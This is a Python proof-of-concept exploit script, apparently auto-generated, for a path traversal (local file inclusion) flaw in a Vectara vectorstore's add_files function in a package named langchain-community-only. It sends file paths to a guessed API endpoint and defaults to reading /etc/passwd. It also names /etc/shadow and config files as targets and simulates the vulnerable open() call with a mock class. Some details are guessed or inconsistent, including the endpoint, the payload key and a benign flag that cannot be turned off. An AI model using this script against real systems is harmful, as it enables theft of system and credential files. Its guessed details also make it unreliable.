#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-009
# Sink: add_files
# Auto-generated — run with: python3 lfi_supply_like_add_files_7.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The add_files function in Vectara vectorstore directly uses user-provided
file paths in an open() call without path validation or sanitization. An attacker can
supply a path like '../../etc/passwd' to read arbitrary files from the server's filesystem.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign test file)
through the vulnerable API endpoint.

Usage:
    python3 poc.py [--target http://localhost:8000] [--file /etc/passwd]
"""

import argparse
import json
import os
import sys
import tempfile
from pathlib import Path

# Try to import requests, provide helpful error if missing
try:
    import requests
except ImportError:
    print("Error: This script requires the 'requests' library.")
    print("Install it with: pip install requests")
    sys.exit(1)


def create_test_file():
    """Create a benign test file to demonstrate the vulnerability safely."""
    test_content = "POC_SUCCESS: This file was read via path traversal vulnerability"
    test_path = os.path.join(tempfile.gettempdir(), "poc_lfi_test.txt")
    with open(test_path, "w") as f:
        f.write(test_content)
    return test_path, test_content


def exploit_lfi(target_url, file_to_read, use_benign=True):
    """
    Exploit the LFI vulnerability by sending a malicious file path to the API.

    Args:
        target_url: Base URL of the vulnerable application
        file_to_read: Path to the file to read (e.g., '../../etc/passwd')
        use_benign: If True, use a benign test file instead of system files

    Returns:
        Response text or error message
    """
    # Create a benign test file if requested
    if use_benign:
        test_path, expected_content = create_test_file()
        # Calculate relative path to the test file
        # We'll use an absolute path for simplicity in the PoC
        file_to_read = test_path
        print(f"[*] Using benign test file: {file_to_read}")
        print(f"[*] Expected content: {expected_content}")

    # The vulnerable endpoint - adjust based on actual application structure
    # This simulates the from_files -> add_files call chain
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"

    # The payload is the file path that will be passed to from_files
    # In the real application, this would be user-controlled input
    payload = {
        "untrusted_user_input": file_to_read
    }

    print(f"[*] Sending exploit to: {endpoint}")
    print(f"[*] Payload: {json.dumps(payload, indent=2)}")

    try:
        # Send the request - the server will call from_files with our path
        response = requests.post(
            endpoint,
            json=payload,
            timeout=30,
            headers={"Content-Type": "application/json"}
        )

        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")

        if response.status_code == 200:
            print("[+] Exploit successful! Response content:")
            print(response.text[:2000])  # Limit output length
            return response.text
        else:
            print(f"[-] Unexpected response: {response.text[:500]}")
            return None

    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("    Make sure the target application is running.")
        return None
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def simulate_direct_exploit():
    """
    Simulate the vulnerability directly by calling the vulnerable function.
    This demonstrates the actual code path without needing a running server.
    """
    print("\n[*] Simulating direct exploit of add_files function...")
    print("[*] This shows how the vulnerability works at the code level.")

    # Create a mock Vectara class to demonstrate the vulnerability
    class MockVectara:
        """Simulates the vulnerable Vectara class for demonstration."""
        
        def __init__(self):
            self._vectara_customer_id = "test_customer"
            self._vectara_corpus_id = "test_corpus"
            self.vectara_api_timeout = 30
            self._session = requests.Session()
        
        def _get_post_headers(self):
            return {"Content-Type": "application/json"}
        
        def add_files(self, files_list, metadatas=None):
            """
            Vulnerable add_files implementation (simplified).
            This is the actual vulnerable code path.
            """
            print(f"[!] add_files called with: {files_list}")
            for inx, file in enumerate(files_list):
                if not os.path.exists(file):
                    print(f"[-] File {file} does not exist, skipping")
                    continue
                
                print(f"[!] Opening file: {file}")
                print(f"[!] This is the LFI sink - open() called with user-controlled path")
                
                # This is the vulnerable line - open() with user-controlled path
                try:
                    with open(file, "rb") as f:
                        content = f.read()
                        print(f"[+] File content (first 500 bytes):")
                        print(content[:500].decode('utf-8', errors='replace'))
                except Exception as e:
                    print(f"[-] Error reading file: {e}")
    
    # Demonstrate with a benign file
    test_path, _ = create_test_file()
    
    print(f"\n[*] Creating mock Vectara instance...")
    vectara = MockVectara()
    
    print(f"\n[*] Calling add_files with path traversal payload...")
    print(f"[*] Payload: ['{test_path}']")
    
    vectara.add_files([test_path])
    
    # Clean up test file
    try:
        os.remove(test_path)
    except:
        pass


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI vulnerability in langchain-community-only Vectara vectorstore"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--benign",
        action="store_true",
        default=True,
        help="Use benign test file instead of system file (default: True)"
    )
    parser.add_argument(
        "--simulate",
        action="store_true",
        help="Simulate the exploit directly without a running server"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    
    if args.simulate:
        simulate_direct_exploit()
    else:
        print(f"\n[*] Target: {args.target}")
        print(f"[*] File to read: {args.file}")
        print(f"[*] Using benign payload: {args.benign}")
        
        result = exploit_lfi(
            target_url=args.target,
            file_to_read=args.file,
            use_benign=args.benign
        )
        
        if result:
            print("\n[+] Exploit completed successfully")
        else:
            print("\n[-] Exploit failed")
    
    print("\n[*] Note: This PoC demonstrates the vulnerability.")
    print("[*] In a real attack, an attacker could read any file the process has access to.")
    print("[*] Examples: /etc/passwd, /etc/shadow, application config files, etc.")


if __name__ == "__main__":
    main()
